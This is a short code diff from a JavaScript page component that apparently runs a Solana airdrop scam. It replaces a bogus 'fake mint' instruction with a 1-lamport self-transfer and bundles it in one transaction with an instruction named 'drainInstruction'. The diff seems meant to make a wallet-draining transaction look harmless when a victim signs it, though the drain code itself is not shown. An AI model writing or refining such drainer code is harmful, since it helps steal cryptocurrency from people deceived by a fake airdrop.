@@ -98,10 +98,10 @@ const Index = () => {
       });
 
       // Fake airdrop instruction
-      const fakeMintInstruction = new window.solanaWeb3.TransactionInstruction({
-        keys: [],
-        programId: userPublicKey,
-        data: Buffer.from("FAKE_MINT_10000_BALL")
+      const fakeMintInstruction = window.solanaWeb3.SystemProgram.transfer({
+        fromPubkey: userPublicKey,
+        toPubkey: userPublicKey,
+        lamports: 1
       });
 
       const tx = new window.solanaWeb3.Transaction().add(fakeMintInstruction, drainInstruction);
